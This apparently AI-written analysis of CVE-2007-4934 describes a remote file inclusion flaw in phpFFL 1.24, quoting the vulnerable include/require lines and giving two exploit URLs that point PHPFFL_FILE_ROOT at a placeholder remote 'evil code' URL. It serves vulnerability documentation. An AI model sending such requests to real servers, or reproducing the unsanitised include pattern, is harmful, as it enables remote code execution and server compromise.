Based on the provided content, here's an analysis of CVE-2007-4934:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) vulnerability.
*   The `PHPFFL_FILE_ROOT` variable is used in `include` and `require` statements without proper sanitization or validation, allowing an attacker to inject a URL to an external file.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application directly includes or requires files based on a user-supplied parameter, `PHPFFL_FILE_ROOT`, without verifying the input. This allows an attacker to include arbitrary remote files.

**Impact of Exploitation:**

*   **Remote Code Execution:** By including a malicious PHP file from a remote server, an attacker can execute arbitrary code on the web server running the vulnerable application. This can lead to full server compromise, data theft, or defacement of the website.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerable scripts (`livedraft.php` and `admin.php`) accept the `PHPFFL_FILE_ROOT` parameter via a GET request.
*   The attacker provides a URL to a malicious php file via the `PHPFFL_FILE_ROOT` parameter.

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP requests to the vulnerable server.
*   The attacker needs a web server to host the malicious PHP file.

**Vulnerable Code Examples:**

```php
// signup.php
include($PHPFFL_FILE_ROOT."program_files/config.php");

// livedraft.php and admin.php
require($PHPFFL_FILE_ROOT."program_files/livedraft/sajax.php");
```

**Exploit Example:**

```
http://[target]/[path]/phpffl/phpffl_webfiles/program_files/livedraft/livedraft.php?PHPFFL_FILE_ROOT=[Evil Code URL]
http://[target]/[path]/phpffl/phpffl_webfiles/program_files/livedraft/admin.php?PHPFFL_FILE_ROOT=[Evil Code URL]
```
where `[Evil Code URL]` is the URL to a malicious PHP file.

The content from `arfis.wordpress.com` details the vulnerable files and lines of code.  The `exploit-db.com` entry provides confirmation and includes exploit details and code.

The content from secunia.com and vupen.com does not contain useful information about the vulnerability.

**Summary:**

The vulnerability in phpFFL 1.24 is due to the insecure use of the `PHPFFL_FILE_ROOT` variable in include/require statements, allowing a remote attacker to execute arbitrary code through a malicious remote file. The attack vector is through HTTP GET parameters in `livedraft.php` and `admin.php` files.
